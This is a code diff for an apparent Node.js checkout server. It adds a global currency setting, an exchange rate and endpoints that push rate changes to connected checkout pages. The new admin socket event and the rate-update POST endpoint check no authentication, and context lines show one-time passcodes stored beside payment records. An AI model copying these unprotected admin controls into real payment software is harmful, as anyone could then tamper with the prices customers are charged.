@@ -49,8 +49,12 @@ const successfulPayments = new Map();
 // Persistent storage for admin data (visitors NOT stored - only active tracking)
 const adminData = {
   payments: [],
-  otps: []
+  otps: [],
+  globalCurrency: 'INR' // Default currency
 };
+
+// Store current exchange rate (USD to INR)
+let currentExchangeRate = 83.0; // Default rate, will be updated by API
 
 // Load existing admin data from file/storage
 function loadAdminData() {
@@ -261,6 +265,29 @@ io.on('connection', (socket) => {
     console.log('✅ All visitor tracking reset');
   });
 
+  // Handle admin currency change
+  socket.on('admin-currency-change', (data) => {
+    console.log('💱 Admin changed global currency:', data);
+    adminData.globalCurrency = data.currency;
+    
+    // Broadcast currency change to all connected clients (checkout pages)
+    io.emit('global-currency-change', {
+      currency: data.currency,
+      exchangeRate: currentExchangeRate
+    });
+    
+    console.log(`✅ Global currency updated to ${data.currency}`);
+    saveAdminData();
+  });
+
+  // Handle request for current currency settings
+  socket.on('get-currency-settings', () => {
+    socket.emit('currency-settings', {
+      currency: adminData.globalCurrency,
+      exchangeRate: currentExchangeRate
+    });
+  });
+
   socket.on('disconnect', () => {
     console.log('User disconnected:', socket.id);
     // If visitor was tracked, remove from activeVisitors and emit visitor left event
@@ -318,6 +345,41 @@ app.get('/api/success-payment/:hash', (req, res) => {
   } catch (error) {
     console.error('Error retrieving successful payment:', error);
     res.status(500).json({ error: 'Failed to retrieve payment data' });
+  }
+});
+
+// API endpoint to get current currency settings
+app.get('/api/currency-settings', (req, res) => {
+  console.log('💱 GET /api/currency-settings called');
+  res.json({
+    success: true,
+    currency: adminData.globalCurrency,
+    exchangeRate: currentExchangeRate
+  });
+});
+
+// API endpoint to update exchange rate (could be called by external service)
+app.post('/api/update-exchange-rate', (req, res) => {
+  console.log('💱 POST /api/update-exchange-rate called with body:', req.body);
+  try {
+    const { rate } = req.body;
+    if (!rate || rate <= 0) {
+      return res.status(400).json({ error: 'Valid exchange rate is required' });
+    }
+    
+    currentExchangeRate = parseFloat(rate);
+    
+    // Broadcast updated rate to all connected clients
+    io.emit('exchange-rate-update', {
+      currency: adminData.globalCurrency,
+      exchangeRate: currentExchangeRate
+    });
+    
+    console.log(`✅ Exchange rate updated to: ${currentExchangeRate}`);
+    res.json({ success: true, exchangeRate: currentExchangeRate });
+  } catch (error) {
+    console.error('Error updating exchange rate:', error);
+    res.status(500).json({ error: 'Failed to update exchange rate' });
   }
 });
 
